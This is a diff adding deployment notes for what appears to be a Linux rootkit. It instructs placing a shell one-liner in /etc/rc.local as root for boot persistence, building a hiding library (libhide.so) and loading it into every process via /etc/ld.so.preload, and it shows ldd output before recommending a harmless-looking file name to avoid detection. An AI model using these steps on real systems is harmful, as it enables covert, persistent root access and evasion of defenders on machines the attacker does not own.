@@ -1,0 +1,28 @@
+The deployment of this method may vary, but we will go over one example using /etc/rc.local. 
+If the service for /etc/rc.local is not configured, you may need to create a systemd start-up script 
+or another start-script that will initiate actions at boot time.  If you look at the rc.local in this 
+folder you will find the one-liner used to create our shell. You can just copy this to /etc/rc.local
+as root.
+
+You may use the Makefile in this directory to build the library for ld.so.preload:
+
+$ make
+cc -fPIC -Wall -Wextra -Werror -pedantic -O2 -pipe --std=c17 -march=native -shared -ldl -s -nostartfiles -o libhide.so multi.c
+
+You can then copy the ld.so.preload or create an /etc/ld.so.preload with the following, or use whatever
+name and location you use for this library file:
+
+/lib/x86_64-linux-gnu/libhide.so
+
+I should note, this will be noticable using ldd:
+
+# ldd /bin/ls
+	linux-vdso.so.1 (0x00007fc87a660000)
+	/lib/x86_64-linux-gnu/libhide.so (0x00007fc87a62b000)
+	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fc87a5ec000)
+	libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007fc87a5e0000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc87a3ea000)
+	libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fc87a33b000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fc87a662000)
+
+So chosing a more uniform and harmless name for this file should be advised. 
